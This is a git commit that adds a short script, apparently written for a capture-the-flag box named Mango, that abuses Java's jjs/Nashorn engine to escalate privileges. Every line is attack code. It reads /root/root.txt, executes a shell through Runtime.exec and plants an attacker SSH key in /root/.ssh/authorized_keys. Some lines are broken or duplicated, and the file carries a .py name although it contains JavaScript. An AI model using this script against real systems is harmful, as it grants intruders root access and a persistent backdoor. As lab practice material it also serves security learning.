538df314ff0b210e58e9ea60bd4d9fb391e4090a
Michael Wells <mwells1286@gmail.com>
2020-03-26 22:02:38 -0400

    add jjs injection script

---
+++ mango/jjs_injection.py
@@ -0,0 +1,15 @@
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("file_to_read"));
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }
+Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/pts/3 >/dev/pts/3 2>/dev/pts/3').waitFor()
+Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh < > 2>').waitFor()
+var FileWriter = Java.type("java.io.FileWriter");
+var fw=new FileWriter("/root/.ssh/authorized_keys");
+fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRnsGbEcu5Rw+asnvZKnmn+Z9SP/nexGUYBY7QJXSWKSf4DZ6Kh2ttmLaw40Mfo6QrmXJOCZ0W0i9RvbsanXlALaS1FXxLMOnk03aGX2wO1un0l1rDCwTkLZ4XrsGP53+wCV2p3RuSE4GG1zLNFL/uimGMBeggNCvGExTixgACbS58PXyx0mrQXnCKTRGdZHaim7pPWMstQDrK6yaKKyRG+orOb/T3nN77kmWk54K1FKJohgzp87ykMUHcTQIdDJlGISX559xW6UfnXRFze2r1OaJXUzP3cly/0hxNfToaR+W8Vqh2iHOcMDaAId/LESvkq7dCJsjnSyKq6r0OIfPQJzImrT3RUS39ocYf7WmeKS5N4IF/bJc2ltJ5s6j25cE5G277K1xvaOP4biGN8/5G2wb5jEzachKgqHqiN9Wjchq83tP75TfQBaBnHQx0N996gk67kzTpZmWSGh2BSLWQrI1EaG3xu28NekDad80j9VAgxCctGYMJPTKc2U7hJLk= root@kali");
+fw.close();
+var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }
+
